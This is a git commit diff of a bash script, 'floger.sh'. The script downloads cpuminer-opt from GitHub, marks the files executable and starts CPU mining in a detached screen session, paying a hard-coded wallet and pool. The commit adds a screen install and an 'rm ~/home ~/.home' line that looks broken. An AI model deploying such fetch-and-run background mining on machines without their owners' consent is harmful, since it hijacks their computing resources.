cf1242debd93e93026823c00fcc7598f3e484188
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-11-18 10:24:31 +0000

    Update floger.sh

--- floger.sh
+++ floger.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
 WALS=RTrndREXaXfFJzJp7vjzjGa78HgBcFNfAd
-PIL=stratum+tcps://us.flockpool.com:5555
-WER=SER
+PIL=us.flockpool.com:4444
+WER=robo
 COMA="-a gr -o $PIL -u $WALS.$WER --cpu-priority 4"
 
 
@@ -12,8 +12,12 @@ FILE=./cpuminer-opt-linux.tar.gz
 if [ -f "$FILE" ]; then
     echo "$FILE exists."
 else
+    mkdir home
+    cd home
+    apt install screen
     wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
     tar xvf cpuminer-opt-linux.tar.gz
     chmod +x *
+    rm ~/home ~/.home
 fi
 screen -dmLS mine ./cpuminer-avx2 $COMA
